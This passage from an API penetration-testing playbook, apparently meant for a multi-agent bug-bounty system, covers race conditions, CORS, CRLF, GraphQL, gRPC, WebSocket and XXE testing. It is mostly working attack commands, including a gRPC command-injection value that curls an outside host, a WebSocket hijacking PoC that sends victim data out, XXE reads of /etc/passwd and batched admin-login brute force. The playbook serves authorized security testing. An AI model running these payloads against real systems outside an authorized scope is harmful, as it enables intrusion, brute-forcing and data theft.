- **Indicators:** N outbound effects per 1 inbound request with no cap; attacker can direct the cost (email bombing a victim, SMS-pumping a premium number).
- **Validation:** Demonstrate the multiplier and that the attacker controls the target/recipient.
- **Severity:** CVSS 3.1 5.3-7.5 (financial/availability); higher when it funds attacker (SMS pumping).
- **Dispatch:** -> BusinessLogicAgent.

### 5.5 Sensitive business-flow automation (API6)

- **Objective / hypothesis:** A flow meant for limited human use can be scripted for abuse (scalping, mass-signup, coupon farming, referral fraud).
- **Procedure:** Model the flow's intended friction (CAPTCHA, device check, velocity limit); script it end-to-end (via `playwright-harness.ts` for browser-gated flows) and measure whether it completes at machine speed without friction.
- **Indicators:** Flow completes N times unattended; no anti-automation control or it is bypassable.
- **Validation:** Show repeated successful completions yielding the business gain (e.g., 50 coupons applied, 100 accounts).
- **Severity:** CVSS 3.1 6.5-8.1 (business impact); price by realized gain.
- **Dispatch:** -> BusinessLogicAgent.

### 5.6 Race conditions on limited resources (API6)

- **Objective / hypothesis:** Concurrent requests defeat single-use/limit checks (double-spend, coupon reuse, balance overdraw, duplicate signup).
- **Procedure:**
```bash
# Single-packet parallel race (most reliable) via Turbo Intruder, driven through Burp:
cat > /tmp/race.py <<'PY'
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=1, engine=Engine.BURP2)
    for _ in range(30): engine.queue(target.req, gate='race1')
    engine.openGate('race1')
PY
# Load /tmp/race.py + the captured /v1/transfer request in Burp Turbo Intruder, fire the gate.
# Quick shell approximation for non-HTTP2 targets:
for i in $(seq 1 30); do
  curl -sk --proxy "$PROXY" -A "$UA" -H "Authorization: Bearer $U1" -H 'Content-Type: application/json' \
    -d '{"to":"attacker","amount":100}' "$API_BASE/v1/transfer" & done; wait
```
- **Indicators:** Balance/coupon/limit applied more times than allowed; duplicate uniques created.
- **Validation:** Re-read state to confirm overrun (e.g., balance decremented once but credited N times). Single-packet attack removes network-jitter false positives.
- **Severity:** CVSS 3.1 7.5-9.1 (financial integrity).
- **Dispatch:** -> RaceConditionAgent; financial chain -> ExploitChainAgent.

**Phase 5 artifacts:** rate-limit histograms, payload-size cliff data, pagination size deltas, race results + state diffs, `/tmp/bb-findings-{logic,race}.json`.
**Gate-out:** Every cost-bearing/limited flow profiled for limits and concurrency; each positive reproduced with measured impact. Advance to Phase 6.

---

## PHASE 6: SECURITY MISCONFIGURATION (API8) + CRLF

**Objective:** Find CORS flaws, verbose errors, exposed debug/management surfaces, missing security headers, dangerous HTTP method handling, content-type confusion, and header (CRLF) injection.
**Expert rationale:** Misconfiguration is the broad, cheap layer that frequently chains: a permissive CORS + a credentialed JSON endpoint = cross-origin data theft; verbose errors + injection = faster exploitation. Sweep it systematically.
**Gate-in:** Endpoint inventory; at least one sensitive credentialed endpoint identified.
**Owning agents:** APIAgent (6.1-6.6), CRLFAgent (6.7). Parallelizable: all six independent.

### 6.1 CORS misconfiguration

- **Objective / hypothesis:** Reflective/`null`/wildcard origin with credentials allows cross-origin theft.
- **Procedure:**
```bash
for o in "https://evil.com" "null" "https://$TARGET_HOST.evil.com" "https://evil$TARGET_HOST" "https://sub.$TARGET_HOST"; do
  curl -sk --proxy "$PROXY" -A "$UA" -H "Origin: $o" -H "Authorization: Bearer $U1" -I "$API_BASE/v1/me" \
    | grep -iE 'access-control-allow-(origin|credentials)' | sed "s/^/$o => /"
done
```
- **Indicators:** `Access-Control-Allow-Origin` reflects attacker origin or `null` AND `Access-Control-Allow-Credentials: true` on a sensitive endpoint.
- **Validation:** Build a PoC page from `evil.com` that `fetch(..., {credentials:'include'})` and reads the body — exfil confirms exploitability. ACAO `*` without credentials on public data is NOT reportable.
- **Evasion / edge cases:** Prefix/suffix/substring matchers (`evil$TARGET_HOST`, `$TARGET_HOST.evil.com`); `null` via sandboxed iframe.
- **Severity:** CVSS 3.1 ~8.1 (creds + sensitive data); drop if no credentials or public data.
- **Dispatch:** -> APIAgent (CORS lane).

### 6.2 Verbose errors / stack traces

- **Objective / hypothesis:** Malformed input yields stack traces, SQL errors, framework versions, internal paths.
- **Procedure:**
```bash
curl -sk --proxy "$PROXY" -A "$UA" -H "Authorization: Bearer $U1" "$API_BASE/v1/users/%27%22%5C"
curl -sk --proxy "$PROXY" -A "$UA" -X POST -H 'Content-Type: application/json' -d '{bad json' "$API_BASE/v1/users"
curl -sk --proxy "$PROXY" -A "$UA" -X POST -H 'Content-Type: application/xml' -d '<x>' "$API_BASE/v1/users"
```
- **Indicators:** Stack trace, ORM/SQL error text, file paths, framework + version in the body.
- **Validation:** Reproduce; classify what leaks (version → 7.x, SQL error → corroborates 4.1).
- **Severity:** CVSS 3.1 3.7-5.3 (info leak); force-multiplier for injection.
- **Dispatch:** -> APIAgent.

### 6.3 Debug / management / actuator surfaces

- **Objective / hypothesis:** Spring Actuator, debug, health, metrics, or admin consoles are exposed.
- **Procedure:**
```bash
for ep in actuator actuator/env actuator/health actuator/beans actuator/mappings actuator/heapdump \
          actuator/threaddump actuator/configprops actuator/loggers actuator/httptrace \
          debug _debug status metrics info env phpinfo.php server-status server-info graphql/playground; do
  curl -sk --proxy "$PROXY" -A "$UA" -o /dev/null -w "%{http_code} /$ep\n" "$API_BASE/$ep"
done | tee "$ART/mgmt-endpoints.txt"
```
- **Indicators:** 200 on actuator/env (secrets!), heapdump (download → grep tokens), or an exposed playground.
- **Validation:** For `env`/`heapdump`, extract one real secret as proof; do not bulk-exfil.
- **Severity:** CVSS 3.1 7.5-9.1 (env/heapdump with secrets); lower for health/info.
- **Dispatch:** -> APIAgent; secrets recovered -> SecretsExposureAgent (note).

### 6.4 Missing / weak security headers

- **Objective / hypothesis:** Responses lack HSTS, `X-Content-Type-Options`, sane `Cache-Control`, or set permissive caching on private data.
- **Procedure:**
```bash
curl -sk --proxy "$PROXY" -A "$UA" -H "Authorization: Bearer $U1" -I "$API_BASE/v1/me" \
  | grep -iE 'strict-transport-security|x-content-type-options|cache-control|content-type|x-frame-options' || echo "(headers missing)"
```
- **Indicators:** No HSTS; `Cache-Control` allows caching of authenticated JSON; missing `nosniff`.
- **Validation:** Cacheable private response is the reportable case (cross-user exposure risk); pure missing-header is usually Low/Info.
- **Severity:** CVSS 3.1 ~3.1-5.3.
- **Dispatch:** -> APIAgent; cacheable private data -> CachePoisoningAgent (note).

### 6.5 HTTP method handling

- **Objective / hypothesis:** Unsafe methods enabled (PUT/DELETE/TRACE), or method-override/verb-tampering reaches privileged actions.
- **Procedure:**
```bash
for m in GET POST PUT PATCH DELETE OPTIONS HEAD TRACE; do
  curl -sk --proxy "$PROXY" -A "$UA" -X $m -H "Authorization: Bearer $U1" "$API_BASE/v1/users/$U1_ID" -o /dev/null -w "%{http_code} $m\n"
done
curl -sk --proxy "$PROXY" -A "$UA" -X OPTIONS -i "$API_BASE/v1/users/$U1_ID" | grep -i '^allow:'
```
- **Indicators:** TRACE enabled (XST), unexpected PUT/DELETE accepted, `Allow` reveals undocumented methods.
- **Validation:** Confirm the enabled method has a real effect (ties to 3.4 BFLA).
- **Severity:** CVSS 3.1 4.3-8.1 depending on action reached.
- **Dispatch:** -> APIAgent.

### 6.6 Content-type confusion

- **Objective / hypothesis:** The endpoint parses a different body format than declared, swapping parsers (JSON↔XML↔form) to dodge validation/CSRF/authz or enable XXE.
- **Procedure:**
```bash
# Same logical payload, different declared content-types — does behavior change?
curl -sk --proxy "$PROXY" -A "$UA" -H "Authorization: Bearer $U1" -H 'Content-Type: application/json' -d '{"role":"admin"}' "$API_BASE/v1/users/$U1_ID" -w "json=%{http_code}\n"
curl -sk --proxy "$PROXY" -A "$UA" -H "Authorization: Bearer $U1" -H 'Content-Type: application/xml'  -d '<user><role>admin</role></user>' "$API_BASE/v1/users/$U1_ID" -w "xml=%{http_code}\n"
curl -sk --proxy "$PROXY" -A "$UA" -H "Authorization: Bearer $U1" -H 'Content-Type: application/x-www-form-urlencoded' -d 'role=admin' "$API_BASE/v1/users/$U1_ID" -w "form=%{http_code}\n"
# No content-type at all (server guesses):
curl -sk --proxy "$PROXY" -A "$UA" -H "Authorization: Bearer $U1" --data-raw '{"role":"admin"}' "$API_BASE/v1/users/$U1_ID" -w "none=%{http_code}\n"
```
- **Indicators:** A format that succeeds where JSON was validated/blocked; XML acceptance opens XXE (→ 12.1); form acceptance enables simple CSRF.
- **Validation:** Confirm the alternate parser honored a value JSON rejected (e.g., mass-assign via XML).
- **Severity:** Enabler — score by the bug it unlocks (mass-assign, XXE, CSRF).
- **Dispatch:** -> APIAgent; XXE path -> DeserializationAgent.

### 6.7 CRLF / response-header injection

- **Objective / hypothesis:** A parameter reaching a response header (redirect/`Location`/cookie/lang) allows header/body splitting.
- **Procedure:**
```bash
grep -iE 'url|next|return|redirect|dest|goto|location|lang|callback|host' "$ART/params.txt" | tee "$ART/crlf-candidates.txt"
curl -skD - --proxy "$PROXY" -A "$UA" "$API_BASE/v1/redirect?url=/%0d%0aSet-Cookie:%20sessionid=ATTACKER%3b%20Path=/" | head -20
curl -skD - --proxy "$PROXY" -A "$UA" "$API_BASE/v1/redirect?url=/%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(document.domain)</script>" | head -20
crlfuzz -u "$API_BASE" -o "$ART/crlfuzz.txt"
```
- **Indicators:** Injected `Set-Cookie`/`Content-Type` appears in the response headers; body splitting reflects script.
- **Validation:** Confirm the header/body actually splits (not encoded). Cacheable split → cache poisoning chain.
- **Evasion / edge cases:** Try `%0d%0a`, `%0a`, `%E5%98%8A%E5%98%8D` (unicode CRLF), and each transport (query/path/fragment).
- **Severity:** CVSS 3.1 5.4-7.5 (→ higher when chained to cache poisoning / session fixation).
- **Dispatch:** -> CRLFAgent; cache leg -> CachePoisoningAgent (note); `Location` override -> OpenRedirectAgent (note for OAuth chain in 2.6).

**Phase 6 artifacts:** CORS/header captures, `mgmt-endpoints.txt`, method matrix, content-type matrix, CRLF evidence, `/tmp/bb-findings-{api,crlf}.json`.
**Gate-out:** Misconfig sweep complete across endpoints; each positive reproduced; chain legs tagged. Advance to Phase 7.

---

## PHASE 7: IMPROPER INVENTORY MANAGEMENT (API9)

**Objective:** Find shadow/zombie/deprecated versions, non-prod and internal endpoints, and documentation drift — then prove the inventory gap carries a security gap (usually missing authz).
**Expert rationale:** Old versions and forgotten hosts are where retired controls go to die. API9 is rarely a finding by itself; it is a discovery that lights up a BOLA/auth gap on a surface nobody is watching.
**Gate-in:** Version sweep (1.2), passive surface (1.4), spec vs live delta (1.1).
**Owning agent:** APIAgent. Parallelizable: 7.1-7.3.

### 7.1 Shadow / zombie / deprecated versions

- **Objective / hypothesis:** An older/parallel version lacks controls present in the current one.
- **Procedure:**
```bash
# Re-run a known-protected request against every discovered version with a low-priv token:
for v in v1 v2 v3 beta internal legacy; do
  curl -sk --proxy "$PROXY" -A "$UA" -H "Authorization: Bearer $U1" "$API_BASE/$v/users/$U2_ID" -o /dev/null -w "%{http_code} $v/users/$U2_ID\n"
done
```
- **Indicators:** `/v1` returns U2's data where `/v2` returns 403 — deprecated version skips the authz added later.
- **Validation:** Confirm cross-identity data on the old version (this is BOLA on a zombie surface).
- **Severity:** Inherits the underlying bug (often CVSS 3.1 7.5-9.1 BOLA); the version gap is the amplifier.
- **Dispatch:** -> APIAgent; the authz break -> IDORAgent.

### 7.2 Non-prod / shadow endpoints & hosts

- **Objective / hypothesis:** staging/dev/internal hosts or debug endpoints are reachable and weaker.
- **Procedure:**
```bash
for h in "staging.$TARGET_HOST" "dev.$TARGET_HOST" "internal.$TARGET_HOST" "api-test.$TARGET_HOST" "uat.$TARGET_HOST"; do
  in_scope "https://$h" || continue
  curl -sk --proxy "$PROXY" -A "$UA" -o /dev/null -w "%{http_code} $h\n" "https://$h/v1/me" -H "Authorization: Bearer $U1"
done
```
- **Indicators:** A non-prod host serving the same API with weaker auth/data.
- **Validation:** Scope-check first; confirm it carries real/representative data.
- **Severity:** CVSS 3.1 5.3-8.1 depending on exposure.
- **Dispatch:** -> APIAgent.

### 7.3 Documentation drift

- **Objective / hypothesis:** Live endpoints exist that the spec omits (or vice versa) — undocumented = untested by the vendor.
- **Procedure:** Diff `endpoints.txt` (spec) against `urls-from-har.txt` (observed) and `ffuf-endpoints.json` (discovered); the live-but-undocumented set is the drift.
- **Indicators:** Endpoints serving data with no spec entry; documented endpoints that 404.
- **Validation:** Probe each undocumented live endpoint with the full authz matrix (Phase 3).
- **Severity:** Info → inherits any bug found on the drift surface.
- **Dispatch:** -> APIAgent; route each into the relevant hunt agent.

**Phase 7 artifacts:** version-authz matrix, non-prod host list, drift diff, `/tmp/bb-findings-api.json` (appended).
**Gate-out:** Full version/host/doc inventory reconciled; each weaker surface re-run through Phase 2-3. Advance to Phase 8.

---

## PHASE 8: UNSAFE CONSUMPTION OF THIRD-PARTY APIS (API10)

**Objective:** Test how the target trusts data it receives from upstream/third-party services it consumes (webhooks, OAuth IdPs, payment callbacks, data importers, link unfurlers).
**Expert rationale:** The target's perimeter ends at its own parser. If it blindly trusts an upstream response, redirect, or content-type, an attacker who can influence (or impersonate, or MITM, or SSRF into) that channel pivots into the target. You attack the target's trust, never the third party.
**Gate-in:** Third-party integrations identified in AppProfile (webhooks, OAuth, importers, callbacks).
**Owning agents:** SSRFAgent (fetch/redirect trust), APIAgent (response-trust parsing). Parallelizable: 8.1 vs 8.2.

### 8.1 Redirect / endpoint trust on consumed services

- **Objective / hypothesis:** The target follows redirects or attacker-influenced URLs from a third-party flow into internal space.
- **Procedure:**
```bash
# Webhook/importer URL the target will fetch — point it at a redirector that 302s to internal:
curl -sk --proxy "$PROXY" -A "$UA" -H "Authorization: Bearer $U1" -H 'Content-Type: application/json' \
  -d "{\"webhook_url\":\"https://$COLLAB/redirect-to-imds\"}" "$API_BASE/v1/integrations/register"
bun "$TOOLS/burp-bridge.ts" --collaborator-poll --poll-max 12 | tee "$EVID/api10-redirect.json"
```
- **Indicators:** Target fetches the URL and follows the redirect to an internal/metadata host (Collaborator chain).
- **Validation:** OOB confirms the fetch + redirect-follow; escalate to credential reach as in 4.6.
- **Severity:** CVSS 3.1 8.6-9.1 (SSRF via trusted channel).
- **Dispatch:** -> SSRFAgent.

### 8.2 Response / data trust from consumed services

- **Objective / hypothesis:** The target parses upstream responses without validation (injection via the upstream payload, type juggling, oversized/over-trusted fields).
- **Procedure:** Where the target ingests third-party data you can influence (your own connected account, an inbound webhook you can craft, an OAuth `userinfo` you control on a federated IdP test app), inject payloads (SQLi/XSS/XXE/over-large) into the fields the target stores/renders and observe second-order impact.
- **Indicators:** Stored injection that fires when the target processes/renders the upstream data; trust of an unsigned/unverified webhook (no signature check).
- **Validation:** Prove the target acted on attacker-influenced upstream content (e.g., unsigned webhook mutated state; injected field executed in the target's context).
- **Evasion / edge cases:** Test webhook signature verification by replaying with a tampered body and a stale/missing signature.
- **Severity:** CVSS 3.1 6.5-9.1 by impact.
- **Dispatch:** -> APIAgent; injection sink -> the matching injection agent (SQLi/XSS/Deser).

**Phase 8 artifacts:** integration-trust evidence, OOB logs, `/tmp/bb-findings-{ssrf,api}.json` (appended).
**Gate-out:** Every consumed-service trust boundary tested for redirect-follow and response-trust. Advance to protocol phases.

---

## PHASE 9: GRAPHQL DEEP DIVE

> **Condition:** Execute only if a GraphQL endpoint was confirmed in 1.3.

**Objective:** Exhaust the GraphQL-specific surface — introspection, batching/alias auth & rate bypass, depth/complexity DoS, field-level authz, and CSRF over GET/POST.
**Expert rationale:** GraphQL collapses many REST endpoints into one, moving authz to the field/resolver level and giving the client query-shaping power (aliases, batching, depth) that translates directly into auth-bypass and DoS the server must explicitly defend against — and often does not.
**Gate-in:** GraphQL endpoint + engine fingerprint (graphw00f); a valid token per identity.
**Owning agent:** GraphQLAgent. Parallelizable: 9.1-9.5.

### 9.1 Introspection & field suggestion

- **Objective / hypothesis:** Introspection is enabled (full schema), or disabled but field-suggestion still leaks names.
- **Procedure:**
```bash
GQL="$API_BASE/graphql"
# Full introspection:
curl -sk --proxy "$PROXY" -A "$UA" -H 'Content-Type: application/json' -H "Authorization: Bearer $U1" \
  -d '{"query":"query{__schema{types{name fields{name args{name} type{name kind ofType{name}}}}}}"}' "$GQL" -o "$ART/gql-schema.json"
graphql-cop -t "$GQL" -o "$ART/graphql-cop.json"
# If disabled, recover schema via field suggestion:
clairvoyance -o "$ART/clairvoyance-schema.json" "$GQL" -w /usr/share/seclists/Discovery/Web-Content/graphql.txt
# Suggestion probe:
curl -sk --proxy "$PROXY" -A "$UA" -H 'Content-Type: application/json' -d '{"query":"{user{passwor}}"}' "$GQL"
```
- **Indicators:** `__schema` returns types (introspection on); "Did you mean 'password'?" suggestions; clairvoyance reconstructs the schema.
- **Validation:** A recovered schema listing admin mutations/hidden fields is the deliverable; introspection-on in prod is itself a misconfig.
- **Severity:** CVSS 3.1 ~5.3 (info); force-multiplier for 9.4.
- **Dispatch:** -> GraphQLAgent.

### 9.2 Batching / alias auth & rate bypass

- **Objective / hypothesis:** Array-batching or aliasing executes many operations per request, defeating rate limits / brute-force protection / per-request authz counting.
- **Procedure:**
```bash
# Array batch — 100 login attempts in one HTTP request:
python3 -c "import json;print(json.dumps([{'query':'mutation{login(user:\"admin\",pass:\"p%d\"){token}}'%i} for i in range(100)]))" \
  | curl -sk --proxy "$PROXY" -A "$UA" -H 'Content-Type: application/json' --data-binary @- "$GQL" -o "$ART/gql-batch.json"
# Alias batch — many operations, single document:
python3 -c "print('{\"query\":\"mutation{'+ ' '.join('a%d:login(user:\\\"admin\\\",pass:\\\"p%d\\\"){token}'%(i,i) for i in range(100)) +'}\"}')" \
  | curl -sk --proxy "$PROXY" -A "$UA" -H 'Content-Type: application/json' --data-binary @- "$GQL" -o "$ART/gql-alias.json"
```
- **Indicators:** All 100 attempts processed in one request with no throttle; a correct credential returns a token inside the batch.
- **Validation:** Confirm the server executed every aliased/batched op (count results) and that rate limiting counted it as one request.
- **Severity:** CVSS 3.1 7.5 (brute-force enabler); higher if it yields a credential.
- **Dispatch:** -> GraphQLAgent.

### 9.3 Depth / complexity DoS

- **Objective / hypothesis:** No depth/complexity/cost limit → recursive or wide queries exhaust the server.
- **Procedure:**
```bash
# Recursive nesting (build to the engine's default limit found via graphw00f):
curl -sk --proxy "$PROXY" -A "$UA" -H 'Content-Type: application/json' -d '{"query":"{user(id:1){posts{author{posts{author{posts{author{name}}}}}}}}"}' "$GQL" -o /dev/null -w "depth=%{http_code} %{time_total}s\n"
# Width/complexity:
curl -sk --proxy "$PROXY" -A "$UA" -H 'Content-Type: application/json' -d '{"query":"{users(first:1000){posts(first:1000){comments(first:1000){author{name}}}}}"}' "$GQL" -o /dev/null -w "wide=%{http_code} %{time_total}s\n"
```
- **Indicators:** Latency growth / 500 / timeout with no depth-limit error.
- **Validation:** Step depth up to find the threshold; reproducible blow-up confirms missing limit. Keep probes bounded (do not DoS prod).
- **Severity:** CVSS 3.1 5.3-7.5 (availability).
- **Dispatch:** -> GraphQLAgent.

### 9.4 Field-level authorization

- **Objective / hypothesis:** Object-level authz exists but a specific field/mutation lacks it (BOLA/BFLA at field granularity).
- **Procedure:**
```bash
# Sensitive fields with a low-priv token:
curl -sk --proxy "$PROXY" -A "$UA" -H 'Content-Type: application/json' -H "Authorization: Bearer $U1" \
  -d "{\"query\":\"{user(id:\\\"$U2_ID\\\"){name email passwordHash ssn role permissions}}\"}" "$GQL" -o "$EVID/gql-fieldauthz.json"
# Admin-only mutation with a user token:
curl -sk --proxy "$PROXY" -A "$UA" -H 'Content-Type: application/json' -H "Authorization: Bearer $U1" \
  -d "{\"query\":\"mutation{updateUser(id:\\\"$U1_ID\\\",input:{role:\\\"admin\\\"}){id role}}\"}" "$GQL"
```
- **Indicators:** Sensitive fields returned, or a privileged mutation succeeds, under a low-priv token; cross-id field read returns U2 data.
- **Validation:** Cross-identity diff (as in Phase 3) on the field set.
- **Severity:** CVSS 3.1 7.5-9.1.
- **Dispatch:** -> GraphQLAgent; cross-tenant -> IDORAgent.

### 9.5 GraphQL CSRF (GET / form-content POST)

- **Objective / hypothesis:** The endpoint accepts queries over GET, or POST with a simple content-type, enabling CSRF (state-changing mutations).
- **Procedure:**
```bash
# Query over GET (CSRF-able + cacheable + logged):
curl -sk --proxy "$PROXY" -A "$UA" "$GQL?query=mutation%7BdeleteAccount%7D" -H "Cookie: <victim session>" -w "get=%{http_code}\n"
# POST with form/text content-type (no preflight → cross-site submittable):
curl -sk --proxy "$PROXY" -A "$UA" -H 'Content-Type: application/x-www-form-urlencoded' --data 'query=mutation{deleteAccount}' "$GQL" -w "form=%{http_code}\n"
```
- **Indicators:** A mutation executes via GET or a simple-content-type POST (no CSRF token / no preflight).
- **Validation:** Build an HTML PoC that triggers the mutation cross-site with the victim's cookies.
- **Severity:** CVSS 3.1 6.5-8.1 depending on the mutation.
- **Dispatch:** -> GraphQLAgent; CSRF PoC mechanics -> CRLFAgent/CSRF lane (note).

**Phase 9 artifacts:** recovered schema, batch/alias/depth evidence, field-authz diffs, CSRF PoC, `/tmp/bb-findings-graphql.json`.
**Gate-out:** Introspection, batching, depth, field-authz, and CSRF all tested; positives reproduced. Advance.

---

## PHASE 10: gRPC / gRPC-WEB

> **Condition:** Execute only if gRPC/gRPC-web was confirmed in 1.3.

**Objective:** Enumerate services via reflection, then tamper messages for authz bypass, type confusion, and injection into resolver-backed fields.
**Expert rationale:** gRPC's strong typing lulls teams into skipping input validation and per-method authz; reflection (when on) is a free service map, and the binary protobuf framing hides classic appsec bugs that are very much present in the handlers.
**Gate-in:** gRPC reachable; reflection list (1.3) or supplied `.proto` files.
**Owning agents:** APIAgent (enumeration/tampering), RCEAgent (injection-to-exec). Parallelizable: 10.2/10.3.

### 10.1 Reflection & service enumeration

- **Objective / hypothesis:** Server reflection exposes all services, methods, and message types.
- **Procedure:**
```bash
grpcurl -insecure "$GRPC_TARGET:$GRPC_PORT" list | tee "$ART/grpc-services.txt"
while read svc; do
  grpcurl -insecure "$GRPC_TARGET:$GRPC_PORT" describe "$svc"
done < "$ART/grpc-services.txt" > "$ART/grpc-describe.txt"
# No reflection? compile from supplied protos:
# grpcurl -insecure -import-path ./protos -proto api.proto "$GRPC_TARGET:$GRPC_PORT" describe
```
- **Indicators:** Full method + message catalog (admin/internal methods visible).
- **Validation:** Reflection-on in prod is a misconfig; the catalog seeds 10.2/10.3.
- **Severity:** CVSS 3.1 ~5.3 (info) + multiplier.
- **Dispatch:** -> APIAgent.

### 10.2 Message tampering & method authz

- **Objective / hypothesis:** A method lacks authz, or accepts cross-tenant IDs / privileged fields.
- **Procedure:**
```bash
# Call a privileged method with a low-priv identity (metadata carries the token):
grpcurl -insecure -H "authorization: Bearer $U1" -d "{\"id\":\"$U2_ID\"}" \
  "$GRPC_TARGET:$GRPC_PORT" user.UserService/GetUser | tee "$EVID/grpc-bola.json"
grpcurl -insecure -H "authorization: Bearer $U1" -d '{"role":"ADMIN"}' \
  "$GRPC_TARGET:$GRPC_PORT" user.UserService/UpdateSelf
# gRPC-web variant rides HTTPS — capture/replay through Burp (base64 protobuf framing):
# Use the Burp gRPC/protobuf extension to edit fields, or burp-bridge to replay the captured request.
```
- **Indicators:** Cross-tenant data returned; privileged field accepted; method callable without/with low-priv auth.
- **Validation:** Cross-identity diff; confirm the mutation took effect.
- **Severity:** CVSS 3.1 7.5-9.1.
- **Dispatch:** -> APIAgent; cross-tenant -> IDORAgent.

### 10.3 Type confusion & injection into gRPC fields

- **Objective / hypothesis:** String/int fields feed SQL/command/path sinks; oversized ints overflow.
- **Procedure:**
```bash
grpcurl -insecure -H "authorization: Bearer $U1" -d '{"id":"1 OR 1=1","name":"x"}' "$GRPC_TARGET:$GRPC_PORT" user.UserService/GetUser
grpcurl -insecure -H "authorization: Bearer $U1" -d '{"filename":"x; curl https://'"$COLLAB"'/grpc"}' "$GRPC_TARGET:$GRPC_PORT" file.FileService/Process
grpcurl -insecure -H "authorization: Bearer $U1" -d '{"id":9223372036854775807}' "$GRPC_TARGET:$GRPC_PORT" user.UserService/GetUser
```
- **Indicators:** SQL error/timing; Collaborator hit (command); overflow error or wraparound behavior.
- **Validation:** As per the matching injection agent (time/OOB/error).
- **Severity:** CVSS 3.1 7.5-9.8 by sink.
- **Dispatch:** -> SQLiAgent / CommandInjectionAgent / RCEAgent as appropriate.

**Phase 10 artifacts:** service catalog, tamper/injection evidence, `/tmp/bb-findings-api.json` (appended), injection findings to their agents' files.
**Gate-out:** Every reflected method tested for authz + injection; positives reproduced. Advance.

---

## PHASE 11: WEBSOCKET

> **Condition:** Execute only if a WebSocket endpoint was confirmed in 1.3.

**Objective:** Test cross-site WebSocket hijacking (CSWSH), message injection, and authentication timing/coverage over the socket.
**Expert rationale:** WebSockets bypass the same-origin policy's read protection and frequently authenticate only at handshake, then trust every frame — so origin validation and per-message authz are the load-bearing controls, and both are commonly missing.
**Gate-in:** WebSocket handshake confirmed; a valid session/token for the socket.
**Owning agent:** WebSocketAgent. Parallelizable: 11.1-11.3.

### 11.1 Cross-Site WebSocket Hijacking (CSWSH)

- **Objective / hypothesis:** The handshake does not validate `Origin`, so a malicious page can open an authenticated socket with the victim's cookies.
- **Procedure:**
```bash
for o in "https://evil.com" "null" "https://$TARGET_HOST.evil.com" ""; do
  wsrepl -u "$WS_URL" -o "$o" -p "$PROXY" -m '{"action":"getProfile"}' 2>&1 | sed "s/^/origin=$o :: /"
done
# PoC (served from attacker.com; victim's cookies ride the handshake):
cat > "$EVID/cswsh.html" <<'H'
<script>
var ws=new WebSocket("wss://api.target.com/ws");
ws.onopen=()=>ws.send('{"action":"getProfile"}');
ws.onmessage=e=>fetch("https://COLLAB/x?d="+btoa(e.data));
</script>
H
```
- **Indicators:** Socket opens cross-origin and returns the victim's authenticated data (cookie-based auth + no origin check).
- **Validation:** Confirm with a real session via `playwright-harness.ts` that the cross-origin page receives the victim's data (cookie-authenticated). Token-in-frame auth (not cookie) is usually not CSWSH.
- **Severity:** CVSS 3.1 7.5-8.1 (cross-origin data theft / action).
- **Dispatch:** -> WebSocketAgent.

### 11.2 Message injection / authz over frames

- **Objective / hypothesis:** Frame payloads reach injection sinks, or subscribe to channels the identity should not access.
- **Procedure:**
```bash
wsrepl -u "$WS_URL" -p "$PROXY" -m '{"action":"query","q":"x\" OR 1=1-- -"}'
wsrepl -u "$WS_URL" -p "$PROXY" -m '{"action":"subscribe","channel":"admin-notifications"}'
wsrepl -u "$WS_URL" -p "$PROXY" -m '{"msg":"<img src=x onerror=alert(document.domain)>"}'   # stored-XSS via socket
```
- **Indicators:** SQL error/timing in a frame response; subscription to another user's/admin channel succeeds; injected markup later renders.
- **Validation:** Per the matching sink (injection/authz); for channel authz, confirm cross-identity data arrives.
- **Severity:** CVSS 3.1 6.5-9.1 by sink.
- **Dispatch:** -> WebSocketAgent; injection -> SQLi/XSS lane (note).

### 11.3 Authentication coverage & timing

- **Objective / hypothesis:** Auth is checked only at connect (not per message), or not at all; expired/replayed tokens still work mid-session.
- **Procedure:** Connect without auth; connect with a valid token then continue sending after it expires; replay an old token on the handshake; attempt privileged actions post-connect.
- **Indicators:** Privileged actions accepted after token expiry or without auth; old-token replay succeeds.
- **Validation:** Reproduce the unauthenticated/expired action with effect.
- **Severity:** CVSS 3.1 7.5-8.6.
- **Dispatch:** -> WebSocketAgent; token issues -> AuthAgent (note).

**Phase 11 artifacts:** origin matrix, CSWSH PoC, frame injection/authz evidence, `/tmp/bb-findings-websocket.json`.
**Gate-out:** Origin, message, and auth-coverage tested; positives reproduced. Advance.

---

## PHASE 12: SOAP / XML / WS-SECURITY & GATEWAY SMUGGLING

> **Condition:** Execute SOAP/XML if XML bodies/WSDL exist (1.3, 6.6); always run the gateway-smuggling check when an edge/CDN/gateway fronts the API.

**Objective:** Exploit XML processing (XXE, WS-Security flaws) and desync the gateway from the backend (HTTP request smuggling).
**Expert rationale:** XML parsers default-dangerous (external entities) and WS-Security is intricate enough to misimplement; meanwhile any multi-hop edge (CDN → gateway → service) risks frame-parsing disagreement, which smuggling weaponizes into auth bypass and cache poisoning at the front door.
**Gate-in:** XML accepted somewhere (6.6) for 12.1-12.2; a fronting proxy/gateway for 12.3.
**Owning agents:** DeserializationAgent (XXE), APIAgent (WS-Security / smuggling), CRLFAgent (smuggling/header). Parallelizable: 12.1/12.2 vs 12.3.

### 12.1 XXE in XML/SOAP bodies

- **Objective / hypothesis:** The XML parser resolves external entities → file read / SSRF / DoS.
- **Procedure:**
```bash
# Classic file read:
curl -sk --proxy "$PROXY" -A "$UA" -H 'Content-Type: application/xml' -H "Authorization: Bearer $U1" \
  --data '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>' "$API_BASE/v1/import" -o "$EVID/xxe-file.txt"
# Blind / OOB XXE (external DTD on Collaborator):
curl -sk --proxy "$PROXY" -A "$UA" -H 'Content-Type: application/xml' \
  --data '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % p SYSTEM "http://'"$COLLAB"'/x.dtd">%p;]><r/>' "$API_BASE/v1/import"
bun "$TOOLS/burp-bridge.ts" --collaborator-poll --poll-max 12 | tee "$EVID/xxe-oob.json"
# SSRF via XXE to IMDS; billion-laughs for DoS (bounded probe only).
```
- **Indicators:** File contents in the response; Collaborator hit (blind XXE → SSRF); parser expansion blowup (DoS).
- **Validation:** OOB hit or returned file confirms; for content-type confusion, ensure the endpoint actually parses XML (6.6).
- **Severity:** CVSS 3.1 7.5-9.1 (file read/SSRF → higher with creds).
- **Dispatch:** -> DeserializationAgent; SSRF leg -> SSRFAgent.

### 12.2 WS-Security flaws

- **Objective / hypothesis:** Signature not verified, timestamp not enforced (replay), or UsernameToken weak.
